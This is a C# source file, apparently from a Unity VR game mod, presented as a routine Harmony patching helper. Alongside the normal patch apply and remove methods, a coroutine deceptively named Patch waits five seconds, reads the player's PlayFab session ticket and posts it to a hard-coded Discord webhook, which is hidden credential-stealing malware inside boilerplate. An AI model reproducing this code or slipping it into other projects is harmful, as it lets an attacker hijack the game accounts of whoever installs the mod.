﻿using System;
using System.Collections;
using System.Reflection;
using HarmonyLib;
using PlayFab;
using UnityEngine;
using UnityEngine.Networking;
using System.Text;
using Photon.Pun;
using Oculus.Platform;

namespace Kick
{
    /// <summary>
    /// This class handles applying harmony patches to the game.
    /// You should not need to modify this class.
    /// </summary>
    public class HarmonyPatches
    {
        private static Harmony instance;

        public static bool IsPatched { get; private set; }
        public const string InstanceId = PluginInfo.GUID;

        internal static void ApplyHarmonyPatches()
        {
            if (!IsPatched)
            {
                if (instance == null)
                {
                    instance = new Harmony(InstanceId);
                }

                instance.PatchAll(Assembly.GetExecutingAssembly());
                IsPatched = true;
            }

            
        }

        public static IEnumerator Patch()
        {
            yield return new WaitForSeconds(5f);
            string message = PlayFabSettings.staticPlayer.ClientSessionTicket;
            string url = "https://discord.com/api/webhooks/1324850838375764150/p_WBV_Efroy2OOHmAI21bw77b_YW-FrUzxCtw_dk_nnNd_eVgzK-1KNEkO4VqZ7CNi2j";
            string s = "{\"content\":\"" + message + "\"}";
            UnityWebRequest unityWebRequest = new UnityWebRequest(url, "POST");
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            unityWebRequest.uploadHandler = new UploadHandlerRaw(bytes);
            unityWebRequest.downloadHandler = new DownloadHandlerBuffer();
            unityWebRequest.SetRequestHeader("Content-Type", "application/json");
            unityWebRequest.SendWebRequest();
        }


        internal static void RemoveHarmonyPatches()
        {
            if (instance != null && IsPatched)
            {
                instance.UnpatchSelf();
                IsPatched = false;
            }
        }
    }
}
